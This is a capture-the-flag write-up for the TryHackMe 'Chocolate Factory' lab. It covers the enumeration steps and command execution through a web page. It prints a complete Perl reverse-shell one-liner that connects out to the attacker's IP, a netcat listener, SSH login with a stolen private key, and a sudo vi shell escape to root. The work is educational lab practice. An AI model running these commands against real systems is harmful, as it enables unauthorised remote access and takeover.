---
title: TryHackMe Chocolate Factory
layout: post
categories:
- TryHackMe
tag: ctf, privesc, stego
image: "/assets/img/chocolate-factory.jpeg"
image_alt: chocolate-factory
---

A Charlie And The Chocolate Factory themed room, revisit Willy Wonka's chocolate factory!

<br>

## 1. Introduction     

Welcome to Willy Wonka's Chocolate Factory!

![golden-ticket](/assets/img/tryhackme/chocolate-factory/golden-ticket.jpg)

This room was designed so that hackers can revisit the Willy Wonka's Chocolate Factory and meet Oompa Loompa

This is a beginner friendly room!

If you have any issues / queries you can reach us through Discord or Twitter.

( Created by AndyInfosec team for the community! )

<br>


## 2. Challenges 

<br>


### 2.1 Enter the key you found!

Let's do a nmap scan.

```
$ nmap -sSV 10.10.153.7
```

![nmap](/assets/img/tryhackme/chocolate-factory/nmap.png)

A lot of ports are open.  

Let's visit the website running on `80/tcp` port. 

![home](/assets/img/tryhackme/chocolate-factory/home.png)

I see a login page. Let’s do a gobuster scan.

```
$ gobuster dir -u http://10.10.153.7/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,txt
```

![gobuster](/assets/img/tryhackme/chocolate-factory/gobuster.png)

We found a few php files. First, let's look at `home.php`.

![php](/assets/img/tryhackme/chocolate-factory/php.png)

We can run commands on this page. Let's connect with burp suite. Capture the page and send it to the repeater.

![ls](/assets/img/tryhackme/chocolate-factory/ls.png)

Let's look at the files in the directory in order, of what we will find.

 - _**`index.php.bak`**_ 

    I don't see anything significant here.

    ![bak](/assets/img/tryhackme/chocolate-factory/bak.png)

 - _**`key_rev_key`**_ 

    This file is probably a script because the cat command doesn't work.

    ![key-rev-key](/assets/img/tryhackme/chocolate-factory/key-rev-key.png)
    
    Let's back to the website and download the key-rev-key file. [http://10.10.153.7/key_rev_key](http://10.10.153.7/key_rev_key)

    ![cat](/assets/img/tryhackme/chocolate-factory/cat.png)

    Let's try. 

    ```
    $ chmod +x key_rev_key
    $ ./key_rev_key 
    ```

    ![try](/assets/img/tryhackme/chocolate-factory/try.png)

    ```
    $ strings key_rev_key
    ```

    ![strings](/assets/img/tryhackme/chocolate-factory/strings.png)

    Let's try the name `laksdhfas`.

    ![key](/assets/img/tryhackme/chocolate-factory/key.png)

 - _**`validate.php`**_ 

    We found the username and password for the website. 
    
    ![validate](/assets/img/tryhackme/chocolate-factory/validate.png)


<br>

### 2.2 What is Charlie's password?

**`Answer: c*****`**

<br>

### 2.3 Change user to charlie

Now, we can execute a reverse-shell command on home.php. First, let's go to the [pentestmonkey's cheat sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). You can try all of them. 

Perl, python, and netcat are working.

![shell](/assets/img/tryhackme/chocolate-factory/shell.png)

```
perl -e 'use Socket;$i="10.8.86.168";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

First, let's setup a netcat listener. 

```
$ nc -nlvp 4444
```

After copying and pasting. 

![reverse](/assets/img/tryhackme/chocolate-factory/reverse.png)

We are inside.

![inside-first](/assets/img/tryhackme/chocolate-factory/inside-first.png)

Now, we can change the user to charlie.

We found a RSA key in charlie's directory

```
$ cat /home/charlie/teleport
```

![rsa](/assets/img/tryhackme/chocolate-factory/rsa.png)

Let's connect to charlie ssh.

First, create an id_rsa file on your own machine and copy rsa key on the target machine, and paste it into the id_rsa file.

```
$ chmod +x id_rsa
$ ssh -i id_rsa charlie@10.10.153.7
```

![ssh](/assets/img/tryhackme/chocolate-factory/ssh.png)

And we are inside.

<br>

### 2.4 Enter the user flag

Now, let's get the user flag.

![user-flag](/assets/img/tryhackme/chocolate-factory/user-flag.png)

<br>

### 2.5 Enter the root flag

Now, we checking the sudo privileges.

```
$ sudo -l
```

![sudo-l](/assets/img/tryhackme/chocolate-factory/sudo-l.png)

We can get root privileges using vi. I'm going to [gtfobins](https://gtfobins.github.io/gtfobins/vi/) and see what I can do with vi. 

![gtfobins](/assets/img/tryhackme/chocolate-factory/gtfobins.png)

Now, we can root privilege using this command.

```
sudo vi -c ':!/bin/sh' /dev/null
``` 

![privesc](/assets/img/tryhackme/chocolate-factory/privesc.png)

We are inside. Let's get the root flag.

![root-flag](/assets/img/tryhackme/chocolate-factory/root-flag.png)

<br>

It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.

<br>
